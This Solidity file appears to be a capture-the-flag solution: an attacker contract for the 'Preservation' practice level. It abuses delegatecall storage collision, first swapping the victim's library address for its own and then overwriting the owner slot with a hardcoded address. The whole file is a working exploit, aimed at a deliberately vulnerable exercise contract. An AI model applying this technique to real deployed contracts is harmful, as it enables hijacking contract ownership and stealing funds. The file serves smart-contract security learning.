//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Preservation.sol";

contract N16PreservationAttacker {
    address addr1;
    address addr2;
    address owner;
    Preservation victim;

    constructor(address targetAddr) {
        victim = Preservation(targetAddr);
    }

    function attack() external {
        //update victim's index zero to malicious contract's address
        victim.setFirstTime(uint256(uint160(address(this))));

        //set the new owner for victim contract
        victim.setFirstTime(uint256(uint160(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266)));
    }

    function setTime(uint256 timeStampInAirquotes) external {
        owner = address(bytes20(uint160(timeStampInAirquotes)));
    }
}
